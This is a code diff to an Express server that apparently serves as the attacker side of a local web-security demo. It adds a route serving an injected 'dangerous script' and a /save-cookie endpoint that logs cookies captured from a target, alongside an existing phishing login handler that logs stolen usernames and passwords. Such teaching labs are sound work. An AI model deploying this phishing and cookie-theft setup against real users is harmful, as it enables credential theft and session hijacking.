@@ -1,6 +1,10 @@
 import express from 'express'
 import config from './config'
 
+import { getDangerousScript } from '../utils/dangerous'
+
+const hostname = 'localhost'
+
 export function start(port: number) {
   const app = express()
 
@@ -30,15 +34,27 @@ export function start(port: number) {
     res.render('phishing')
   })
 
-  app.get('/search-link', (_req, res) => {
-    res.render('search-link')
-  })
-
   app.post('/login', (req, res) => {
     console.log('STEALING username and password from user, can now impersonate!')
     console.log(`username: ${req.body.username}`)
     console.log(`password: ${req.body.password}`)
+    console.log()
     res.redirect('http://localhost:3000/csrf/login')
+  })
+
+  app.get('/search-link', (_req, res) => {
+    res.render('search-link')
+  })
+
+  app.get('/search-danger', (_req, res) => {
+    res.render('search-danger', { dangerousScript: getDangerousScript(hostname, port) })
+  })
+
+  app.post('/save-cookie', (req, res) => {
+    console.log('CAPTURED cookie from target!')
+    console.log(`Cookie: ${req.body.cookie}`)
+    console.log()
+    res.sendStatus(204)
   })
 
   console.log(`- listening on port ${port} `)
